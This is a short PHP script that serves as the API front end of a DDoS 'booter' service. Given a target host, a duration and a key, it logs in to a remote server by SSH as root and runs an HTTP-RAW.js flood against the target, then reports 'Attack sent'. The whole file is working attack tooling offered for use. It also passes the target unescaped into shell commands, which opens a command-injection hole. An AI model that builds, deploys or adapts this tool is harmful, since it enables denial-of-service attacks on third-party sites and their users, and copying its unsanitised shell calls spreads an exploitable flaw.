<?php
    include('Net/SSH2.php');

    $address = "IP"; // Your IP Server

    $serverPort = 22; // SSH Port (Default 22)
    
    $user = "root"; // User login your server
    
    $password = "password"; // Password login your server
    
    $Methods = array("raw", "stop"); //Array of methods

    $APIKey = "free"; //Your API Key

    $target = $_GET["host"];
    $duration = intval($_GET['time']);
    $method = $_GET["method"];

    $key = $_GET["key"];

    if (empty($target) | empty($duration) | empty($method)) //Checking the fields
    {
        die("Please verify all fields");
    }
  
    if (!filter_var($target, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) && !filter_var($target, FILTER_VALIDATE_URL)) //Validating target
    {
        die('Please insert a correct IP address(v4)/URL..');
    }

    if ($duration < 1) //Validating time
    {
        die("Time is invalid");
    }

    if (!in_array($method, $Methods)) //Validating method
    {
        die("Method is invalid");
    }
    
    if ($key !== $APIKey) //Validating API Key
    { 
        die("Invalid API Key");
    }

    $connection = ssh2_connect($address, $serverPort);
    if(ssh2_auth_password($connection, $user, $password))
    {
        if($method == "raw"){if(ssh2_exec($connection, "screen -dm timeout $duration node HTTP-RAW.js $target $duration")){echo "Attack sent to $target for $duration seconds using $method!";}else{die("Ran into a error");}}
        if($method == "stop"){if(ssh2_exec($connection, "pkill -f $target")){echo "Attack stopped on $host!";}else{die("Ran into a error");}}      
    }
    else
    {
        die("Connection to server failed.");
    }
?>